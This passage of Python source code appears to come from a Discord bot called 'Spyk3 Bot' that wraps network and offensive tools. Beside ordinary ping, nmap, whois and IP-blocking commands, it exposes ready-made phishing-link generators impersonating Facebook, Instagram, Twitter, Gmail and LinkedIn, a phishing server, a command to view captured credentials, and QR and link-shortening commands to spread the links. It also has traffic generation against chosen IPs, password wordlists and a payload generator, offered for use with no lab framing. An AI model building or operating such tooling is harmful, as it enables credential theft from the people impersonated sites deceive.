            result = self.handler.execute("traffic_help", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto')
        async def nikto_command(ctx, target: str, *options):
            if not await self.check_permissions(ctx):
                return
            await ctx.send(f"🕷️ Starting Nikto web vulnerability scan on {target}...")
            cmd = f"nikto {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_ssl')
        async def nikto_ssl_command(ctx, target: str):
            if not await self.check_permissions(ctx):
                return
            await ctx.send(f"🔒 Running Nikto SSL/TLS scan on {target}...")
            result = self.handler.execute(f"nikto_ssl {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_sql')
        async def nikto_sql_command(ctx, target: str):
            if not await self.check_permissions(ctx):
                return
            await ctx.send(f"💉 Running Nikto SQL injection scan on {target}...")
            result = self.handler.execute(f"nikto_sql {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_xss')
        async def nikto_xss_command(ctx, target: str):
            if not await self.check_permissions(ctx):
                return
            await ctx.send(f"🔄 Running Nikto XSS scan on {target}...")
            result = self.handler.execute(f"nikto_xss {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_cgi')
        async def nikto_cgi_command(ctx, target: str):
            if not await self.check_permissions(ctx):
                return
            await ctx.send(f"📁 Running Nikto CGI scan on {target}...")
            result = self.handler.execute(f"nikto_cgi {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_full')
        async def nikto_full_command(ctx, target: str):
            if not await self.check_permissions(ctx):
                return
            await ctx.send(f"🔬 Running full Nikto scan on {target}...")
            result = self.handler.execute(f"nikto_full {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_status')
        async def nikto_status_command(ctx):
            result = self.handler.execute("nikto_status", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nikto_results')
        async def nikto_results_command(ctx, limit: int = 5):
            result = self.handler.execute(f"nikto_results {limit}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='add_ip')
        async def add_ip_command(ctx, ip: str, *, notes: str = ""):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"add_ip {ip} {notes}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='remove_ip')
        async def remove_ip_command(ctx, ip: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"remove_ip {ip}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='block_ip')
        async def block_ip_command(ctx, ip: str, *, reason: str = "Manually blocked via Discord"):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"block_ip {ip} {reason}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='unblock_ip')
        async def unblock_ip_command(ctx, ip: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"unblock_ip {ip}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='list_ips')
        async def list_ips_command(ctx, filter_type: str = "all"):
            if not await self.check_permissions(ctx):
                return
            filter_param = ""
            if filter_type.lower() == 'active':
                filter_param = "active"
            elif filter_type.lower() == 'blocked':
                filter_param = "blocked"
            result = self.handler.execute(f"list_ips {filter_param}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='ip_info')
        async def ip_info_command(ctx, ip: str):
            if not await self.check_permissions(ctx):
                return
            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await ctx.send(f"❌ Invalid IP address: {ip}")
                return
            result = self.handler.execute(f"ip_info {ip}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='whatsapp_config')
        async def whatsapp_config_command(ctx, phone_number: str, prefix: str = "/"):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"whatsapp_config {phone_number} {prefix}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='whatsapp_allow')
        async def whatsapp_allow_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"whatsapp_allow {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='whatsapp_disallow')
        async def whatsapp_disallow_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"whatsapp_disallow {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='signal_config')
        async def signal_config_command(ctx, phone_number: str, prefix: str = "!"):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"signal_config {phone_number} {prefix}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='signal_allow')
        async def signal_allow_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"signal_allow {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='signal_disallow')
        async def signal_disallow_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"signal_disallow {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='signal_register')
        async def signal_register_command(ctx):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute("signal_register", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='slack_config')
        async def slack_config_command(ctx, bot_token: str, channel_id: str = "", prefix: str = "!"):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"slack_config {bot_token} {channel_id} {prefix}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='slack_allow')
        async def slack_allow_command(ctx, user_id: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"slack_allow {user_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='slack_disallow')
        async def slack_disallow_command(ctx, user_id: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"slack_disallow {user_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='imessage_config')
        async def imessage_config_command(ctx, *phone_numbers):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            numbers = list(phone_numbers) if phone_numbers else []
            result = self.handler.execute(f"imessage_config {' '.join(numbers)}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='imessage_allow')
        async def imessage_allow_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"imessage_allow {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='imessage_disallow')
        async def imessage_disallow_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"imessage_disallow {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='imessage_add_watch')
        async def imessage_add_watch_command(ctx, phone_number: str):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"imessage_add_watch {phone_number}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_facebook')
        async def phishing_facebook_command(ctx):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute("generate_phishing_link_for_facebook", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_instagram')
        async def phishing_instagram_command(ctx):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute("generate_phishing_link_for_instagram", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_twitter')
        async def phishing_twitter_command(ctx):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute("generate_phishing_link_for_twitter", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_gmail')
        async def phishing_gmail_command(ctx):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute("generate_phishing_link_for_gmail", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_linkedin')
        async def phishing_linkedin_command(ctx):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute("generate_phishing_link_for_linkedin", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='generate_phishing_link_for_custom')
        async def phishing_custom_command(ctx, custom_url: str = None):
            if not await self.check_permissions(ctx):
                return
            cmd = "generate_phishing_link_for_custom"
            if custom_url:
                cmd += f" {custom_url}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_start_server')
        async def phishing_start_command(ctx, link_id: str, port: int = 8080):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute(f"phishing_start_server {link_id} {port}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_stop_server')
        async def phishing_stop_command(ctx):
            if not await self.check_permissions(ctx, admin_only=True):
                return
            result = self.handler.execute("phishing_stop_server", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_status')
        async def phishing_status_command(ctx):
            result = self.handler.execute("phishing_status", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_links')
        async def phishing_links_command(ctx):
            result = self.handler.execute("phishing_links", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_credentials')
        async def phishing_credentials_command(ctx, link_id: str = None):
            cmd = "phishing_credentials"
            if link_id:
                cmd += f" {link_id}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_qr')
        async def phishing_qr_command(ctx, link_id: str):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute(f"phishing_qr {link_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='phishing_shorten')
        async def phishing_shorten_command(ctx, link_id: str):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute(f"phishing_shorten {link_id}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='help')
        async def help_command(ctx):
            embed = discord.Embed(
                title="🕷️ Spyk3 Bot v10.0.0 - Help Menu",
                description="**2000+ Advanced Cybersecurity Commands**\n\nType `!command` to execute",
                color=discord.Color.green()
            )
            
            embed.add_field(
                name="🔐 **CRUNCH Wordlist Generator**",
                value="`!crunch_generate <name> <min> <max> [pattern] [charset]` - Generate wordlist\n"
                      "`!crunch_list` - List generated wordlists\n"
                      "`!crunch_info <id>` - Show wordlist details\n"
                      "`!crunch_delete <id>` - Delete wordlist\n"
                      "`!crunch_charsets` - Show available charsets",
                inline=False
            )
            
            embed.add_field(
                name="🔌 **SSH Commands**",
                value="`!ssh_add <name> <host> <user> [password] [port]` - Add SSH server\n"
                      "`!ssh_list` - List SSH servers\n"
                      "`!ssh_connect <id>` - Connect to server\n"
                      "`!ssh_exec <id> <command>` - Execute command\n"
                      "`!ssh_upload <id> <local> <remote>` - Upload file\n"
                      "`!ssh_download <id> <remote> <local>` - Download file\n"
                      "`!ssh_disconnect [id]` - Disconnect",
                inline=False
            )
            
            embed.add_field(
                name="⏰ **Time & Date Commands**",
                value="`!time` - Show current time\n"
                      "`!date` - Show current date\n"
                      "`!datetime` - Show both date and time\n"
                      "`!history [limit]` - View command history\n"
                      "`!time_history` - View time command history",
                inline=False
            )
            
            embed.add_field(
                name="🚀 **Traffic Generation**",
                value="`!generate_traffic <type> <ip> <duration> [port] [rate]` - Generate real traffic\n"
                      "`!traffic_types` - List available traffic types\n"
                      "`!traffic_status` - Check active generators\n"
                      "`!traffic_stop [id]` - Stop traffic generation\n"
                      "`!traffic_logs [limit]` - View traffic logs",
                inline=False
            )
            
            embed.add_field(
                name="🎣 **Social Engineering**",
                value="`!generate_phishing_link_for_facebook` - Facebook phishing\n"
                      "`!generate_phishing_link_for_instagram` - Instagram phishing\n"
                      "`!generate_phishing_link_for_twitter` - Twitter phishing\n"
                      "`!generate_phishing_link_for_gmail` - Gmail phishing\n"
                      "`!generate_phishing_link_for_linkedin` - LinkedIn phishing\n"
                      "`!generate_phishing_link_for_custom [url]` - Custom phishing\n"
                      "`!phishing_start_server <id> [port]` - Start server\n"
                      "`!phishing_stop_server` - Stop server\n"
                      "`!phishing_status` - Check server status\n"
                      "`!phishing_links` - List all links\n"
                      "`!phishing_credentials [id]` - View captured data\n"
                      "`!phishing_qr <id>` - Generate QR code\n"
                      "`!phishing_shorten <id>` - Shorten URL",
                inline=False
            )
            
            embed.add_field(
                name="🕷️ **Nikto Web Scanner**",
                value="`!nikto <target>` - Basic web vuln scan\n"
                      "`!nikto_full <target>` - Full scan with all tests\n"
                      "`!nikto_ssl <target>` - SSL/TLS specific scan\n"
                      "`!nikto_sql <target>` - SQL injection scan\n"
                      "`!nikto_xss <target>` - XSS scan\n"
                      "`!nikto_cgi <target>` - CGI scan\n"
                      "`!nikto_status` - Check scanner status",
                inline=False
            )
            
            embed.add_field(
                name="🔒 **IP Management**",
                value="`!add_ip <ip> [notes]` - Add IP to monitoring\n"
                      "`!remove_ip <ip>` - Remove IP from monitoring\n"
                      "`!block_ip <ip> [reason]` - Block IP address\n"
                      "`!unblock_ip <ip>` - Unblock IP address\n"
                      "`!list_ips [all/active/blocked]` - List managed IPs\n"
                      "`!ip_info <ip>` - Detailed IP information",
                inline=False
            )
            
            embed.add_field(
                name="📱 **Messaging Platforms**",
                value="`!whatsapp_config <phone> [prefix]` - Configure WhatsApp\n"
                      "`!signal_config <phone> [prefix]` - Configure Signal\n"
                      "`!slack_config <token> [channel] [prefix]` - Configure Slack\n"
                      "`!imessage_config [numbers...]` - Configure iMessage\n"
                      "`!whatsapp_allow <phone>` - Allow WhatsApp contact\n"
                      "`!signal_allow <phone>` - Allow Signal number\n"
                      "`!slack_allow <user>` - Allow Slack user\n"
                      "`!imessage_allow <phone>` - Allow iMessage number",
                inline=False
            )
            
            embed.add_field(
                name="🤖 **Basic Commands**",
                value="`!ping <ip>` - Ping IP\n"
                      "`!scan <ip>` - Port scan (1-1000)\n"
                      "`!quick_scan <ip>` - Fast port scan\n"
                      "`!nmap <ip> [options]` - Full nmap scan\n"
                      "`!traceroute <target>` - Network path tracing",
                inline=False
            )
            
            embed.set_footer(text=f"Requested by {ctx.author.name} | Prefix: {self.config.get('prefix', '!')}")
            await ctx.send(embed=embed)
        
        @self.bot.command(name='ping')
        async def ping_command(ctx, target: str, *options):
            await ctx.send(f"🏓 Pinging {target}...")
            cmd = f"ping {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='scan')
        async def scan_command(ctx, target: str, ports: str = None):
            await ctx.send(f"🔍 Scanning {target}...")
            cmd = f"scan {target}"
            if ports:
                cmd += f" {ports}"
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='quick_scan')
        async def quick_scan_command(ctx, target: str):
            await ctx.send(f"⚡ Quick scanning {target}...")
            result = self.handler.execute(f"quick_scan {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='nmap')
        async def nmap_command(ctx, target: str, *options):
            await ctx.send(f"🔬 Running nmap on {target}...")
            cmd = f"nmap {target}"
            if options:
                cmd += " " + " ".join(options)
            result = self.handler.execute(cmd, "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='traceroute')
        async def traceroute_command(ctx, target: str):
            await ctx.send(f"🛣️ Tracing route to {target}...")
            result = self.handler.execute(f"traceroute {target}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='whois')
        async def whois_command(ctx, domain: str):
            await ctx.send(f"🔎 WHOIS lookup for {domain}...")
            result = self.handler.execute(f"whois {domain}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='dns')
        async def dns_command(ctx, domain: str):
            await ctx.send(f"📡 DNS lookup for {domain}...")
            result = self.handler.execute(f"dns {domain}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='location')
        async def location_command(ctx, ip: str):
            await ctx.send(f"📍 Getting location for {ip}...")
            result = self.handler.execute(f"location {ip}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='analyze')
        async def analyze_command(ctx, ip: str):
            await ctx.send(f"🔬 Analyzing IP {ip}...")
            result = self.handler.execute(f"analyze {ip}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='system')
        async def system_command(ctx):
            await ctx.send("💻 Getting system information...")
            result = self.handler.execute("system", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='status')
        async def status_command(ctx):
            await ctx.send("📊 Getting system status...")
            result = self.handler.execute("status", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='threats')
        async def threats_command(ctx, limit: int = 10):
            result = self.handler.execute(f"threats {limit}", "discord")
            await self.send_result(ctx, result)
        
        @self.bot.command(name='report')
        async def report_command(ctx):
            await ctx.send("📊 Generating security report...")
            result = self.handler.execute("report", "discord")
            await self.send_result(ctx, result)
    
    async def check_permissions(self, ctx, admin_only: bool = False) -> bool:
        if ctx.author.guild_permissions.administrator:
            return True
        
        admin_role = self.config.get('admin_role', 'Admin')
        security_role = self.config.get('security_role', 'Security Team')
        
        user_roles = [role.name for role in ctx.author.roles]
        
        if admin_only:
            if admin_role in user_roles or ctx.author.guild_permissions.administrator:
                return True
            else:
                await ctx.send(f"❌ This command requires the `{admin_role}` role or Administrator permissions.")
                return False
        else:
            if admin_role in user_roles or security_role in user_roles or ctx.author.guild_permissions.administrator:
                return True
            else:
                await ctx.send(f"❌ This command requires the `{admin_role}` or `{security_role}` role.")
                return False
    
    async def send_result(self, ctx, result):
        if not result['success']:
            error_msg = result.get('output', 'Unknown error')
            if len(error_msg) > 1000:
                error_msg = error_msg[:1000] + "..."
            embed = discord.Embed(
                title="❌ Command Failed",
                description=f"```{error_msg}```",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        if len(formatted) > 2000:
            formatted = formatted[:1900] + "\n\n... (output truncated)"
        
        embed = discord.Embed(
            title=f"✅ Command Executed ({result['execution_time']:.2f}s)",
            description=f"```{formatted}```",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            logger.info("Discord bot started in background thread")
            return True
        return False
    
    def _run_discord_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Handle all 2000+ commands"""
    
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None,
                 crunch_generator: CrunchGenerator = None):
        self.db = db
        self.ssh = ssh_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.crunch = crunch_generator
        self.time_manager = TimeManager(db)
        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.nmap = NmapScanner(db)
        self.aux = AuxiliaryModules(db)
        self.payloads = PayloadGenerator(db)
        self.sessions = SessionManager(db)
        self.workspaces = WorkspaceManager(db)
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        return {
            # Crunch Wordlist Commands
            'crunch': self._execute_crunch_help,
            'crunch_generate': self._execute_crunch_generate,
            'crunch_list': self._execute_crunch_list,
            'crunch_info': self._execute_crunch_info,
            'crunch_delete': self._execute_crunch_delete,
            'crunch_charsets': self._execute_crunch_charsets,
            
            # Time and Date Commands
            'time': self._execute_time,
            '!time': self._execute_time,
            'date': self._execute_date,
            '!date': self._execute_date,
            'datetime': self._execute_datetime,
            '!datetime': self._execute_datetime,
            'now': self._execute_datetime,
            'history': self._execute_history,
            '!history': self._execute_history,
            'time_history': self._execute_time_history,
            '!time_history': self._execute_time_history,
            'timezone': self._execute_timezone,
            'time_diff': self._execute_time_diff,
            'date_diff': self._execute_date_diff,
            'time_add': self._execute_time_add,
            'date_add': self._execute_date_add,
            
            # SSH Commands
            'ssh_add': self._execute_ssh_add,
            'ssh_list': self._execute_ssh_list,
            'ssh_connect': self._execute_ssh_connect,
            'ssh_exec': self._execute_ssh_exec,
            'ssh_upload': self._execute_ssh_upload,
            'ssh_download': self._execute_ssh_download,
            'ssh_disconnect': self._execute_ssh_disconnect,
            'ssh_status': self._execute_ssh_status,
            
            # Ping commands
            'ping': self._execute_ping,
            'ping4': self._execute_ping,
            'ping6': self._execute_ping6,
            
            # Scan commands
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'portscan': self._execute_portscan,
            'full_scan': self._execute_full_scan,
            'web_scan': self._execute_web_scan,
            
            # Nikto web scanner
            'nikto': self._execute_nikto,
            'web_vuln': self._execute_nikto,
            'nikto_full': self._execute_nikto_full,
            'nikto_ssl': self._execute_nikto_ssl,
            'nikto_cgi': self._execute_nikto_cgi,
            'nikto_sql': self._execute_nikto_sql,
            'nikto_xss': self._execute_nikto_xss,
            
            # Traffic Generation Commands
            'generate_traffic': self._execute_generate_traffic,
            'traffic': self._execute_generate_traffic,
            'gen_traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_status': self._execute_traffic_status,
            'traffic_stop': self._execute_traffic_stop,
            'traffic_logs': self._execute_traffic_logs,
            'traffic_help': self._execute_traffic_help,
            
            # Traceroute commands
            'traceroute': self._execute_traceroute,
            'tracert': self._execute_traceroute,
            'tracepath': self._execute_tracepath,
            
            # Web commands
            'curl': self._execute_curl,
            'wget': self._execute_wget,
            'http': self._execute_http,
            
            # Info commands
            'whois': self._execute_whois,
            'dig': self._execute_dig,
            'dns': self._execute_dns,
            'location': self._execute_location,
            'analyze': self._execute_analyze,
            'ip_info': self._execute_ip_info,
            
            # System commands
            'system': self._execute_system,
            'network': self._execute_network,
            'status': self._execute_status,
            'ps': self._execute_ps,
            'top': self._execute_top,
            
            # Security commands
            'threats': self._execute_threats,
            'report': self._execute_report,
            'monitor': self._execute_monitor,
            
            # IP Management
            'add_ip': self._execute_add_ip,
            'remove_ip': self._execute_remove_ip,
            'block_ip': self._execute_block_ip,
            'unblock_ip': self._execute_unblock_ip,
            'list_ips': self._execute_list_ips,
            
            # Nikto management
            'nikto_status': self._execute_nikto_status,
            'nikto_results': self._execute_nikto_results,
            
            # WhatsApp management
            'whatsapp_config': self._execute_whatsapp_config,
            'whatsapp_allow': self._execute_whatsapp_allow,
            'whatsapp_disallow': self._execute_whatsapp_disallow,
            'whatsapp_status': self._execute_whatsapp_status,
            
            # Signal management
            'signal_config': self._execute_signal_config,
            'signal_allow': self._execute_signal_allow,
            'signal_disallow': self._execute_signal_disallow,
            'signal_register': self._execute_signal_register,
            'signal_status': self._execute_signal_status,
            
            # Slack management
            'slack_config': self._execute_slack_config,
            'slack_allow': self._execute_slack_allow,
            'slack_disallow': self._execute_slack_disallow,
            'slack_status': self._execute_slack_status,
            
            # iMessage management
            'imessage_config': self._execute_imessage_config,
            'imessage_allow': self._execute_imessage_allow,
            'imessage_disallow': self._execute_imessage_disallow,
            'imessage_add_watch': self._execute_imessage_add_watch,
            'imessage_status': self._execute_imessage_status,
            
            # Social Engineering Commands
            'generate_phishing_link_for_facebook': self._execute_phishing_facebook,
            'generate_phishing_link_for_instagram': self._execute_phishing_instagram,
            'generate_phishing_link_for_twitter': self._execute_phishing_twitter,
            'generate_phishing_link_for_gmail': self._execute_phishing_gmail,
            'generate_phishing_link_for_linkedin': self._execute_phishing_linkedin,
            'generate_phishing_link_for_custom': self._execute_phishing_custom,
            'phishing_start_server': self._execute_phishing_start,
            'phishing_stop_server': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten,
            'phishing_template': self._execute_phishing_template,
            
            # Nmap commands
            '!db_nmap': self._execute_db_nmap,
            
            # Auxiliary modules
            '!use': self._execute_use,
            '!set': self._execute_set,
            '!run': self._execute_run,
            '!show': self._execute_show,
            
            # Host/service commands
            '!hosts': self._execute_hosts,
            '!services': self._execute_services,
            
            # Workspace commands
            '!workspace': self._execute_workspace,
            
            # Session commands
            '!sessions': self._execute_sessions,
            
            # Route commands
            '!route': self._execute_route,
            
            # Payload generation
            '!generate': self._execute_generate,
            
            # Help
            '!help': self._execute_help,
            'help': self._execute_help
        }
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return results"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                result = self._execute_generic(command)
            
            execution_time = time.time() - start_time
            
            self.db.log_command(
                command=command,
                source=source,
                success=result.get('success', False),
                output=result.get('output', '')[:5000],
                execution_time=execution_time
            )
            
            if cmd_name in ['time', '!time', 'date', '!date', 'datetime', 'now']:
                self.db.log_time_command(
                    command=cmd_name,
                    user=source,
                    result=str(result.get('output', ''))[:100]
                )
            
            result['execution_time'] = execution_time
            return result
        
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            
            self.db.log_command(
                command=command,
                source=source,
                success=False,
                output=error_msg,
                execution_time=execution_time
            )
            
            return self._create_result(False, error_msg, execution_time)
    
    def _create_result(self, success: bool, data: Any, execution_time: float = 0.0) -> Dict[str, Any]:
        if isinstance(data, str):
            return {'success': success, 'output': data, 'execution_time': execution_time}
        else:
            return {'success': success, 'data': data, 'execution_time': execution_time}
    
    # ==================== Crunch Command Handlers ====================
    def _execute_crunch_help(self, args: List[str]) -> Dict[str, Any]:
        help_text = """
🔐 **CRUNCH Wordlist Generator Commands**

`crunch_generate <name> <min> <max> [pattern] [charset]` - Generate a wordlist
  • name: Name for the wordlist
  • min: Minimum length
  • max: Maximum length
  • pattern: Pattern to use (lower, upper, mixed, numeric, alphanum, special, hex)
  • charset: Custom character set (optional)

`crunch_list` - List all generated wordlists
`crunch_info <wordlist_id>` - Show detailed information about a wordlist
`crunch_delete <wordlist_id>` - Delete a wordlist
`crunch_charsets` - Show available character sets

**Examples:**
  crunch_generate passwords 8 12 alphanum
  crunch_generate pin_codes 4 6 numeric
  crunch_generate custom 5 10 mixed abcdefghijklmnopqrstuvwxyz1234567890
  crunch_list
  crunch_info abc12345
        """
        return self._create_result(True, help_text)
    
    def _execute_crunch_generate(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch generator not initialized")
        
        if len(args) < 3:
            return self._create_result(False, "Usage: crunch_generate <name> <min> <max> [pattern] [charset]")
        
        name = args[0]
        try:
            min_length = int(args[1])
            max_length = int(args[2])
        except ValueError:
            return self._create_result(False, "Invalid length parameters")
        
        pattern = None
        charset = None
        
        if len(args) >= 4:
            pattern = args[3]
        if len(args) >= 5:
            charset = args[4]
        
        result = self.crunch.generate_wordlist(name, min_length, max_length, pattern, charset)
        return self._create_result(result['success'], result)
    
    def _execute_crunch_list(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch generator not initialized")
        
        wordlists = self.crunch.get_wordlists()
        return self._create_result(True, {'wordlists': wordlists, 'count': len(wordlists)})
    
    def _execute_crunch_info(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch generator not initialized")
        
        if not args:
            return self._create_result(False, "Usage: crunch_info <wordlist_id>")
        
        wordlist = self.crunch.get_wordlist(args[0])
        if wordlist:
            return self._create_result(True, wordlist)
        else:
            return self._create_result(False, f"Wordlist {args[0]} not found")
    
    def _execute_crunch_delete(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch generator not initialized")
        
        if not args:
            return self._create_result(False, "Usage: crunch_delete <wordlist_id>")
        
        if self.crunch.delete_wordlist(args[0]):
            return self._create_result(True, f"Wordlist {args[0]} deleted")
        else:
            return self._create_result(False, f"Failed to delete wordlist {args[0]}")
    
    def _execute_crunch_charsets(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch generator not initialized")
        
        charsets = self.crunch.get_charsets()
        return self._create_result(True, charsets)
    
    # ==================== Time Command Handlers ====================
    def _execute_time(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        result = self.time_manager.get_current_time(full)
        return self._create_result(True, result)
    
    def _execute_date(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        result = self.time_manager.get_current_date(full)
        return self._create_result(True, result)
    
    def _execute_datetime(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        result = self.time_manager.get_datetime(full)
        return self._create_result(True, result)
    
    def _execute_timezone(self, args: List[str]) -> Dict[str, Any]:
        result = self.time_manager.get_timezone_info()
        return self._create_result(True, result)
    
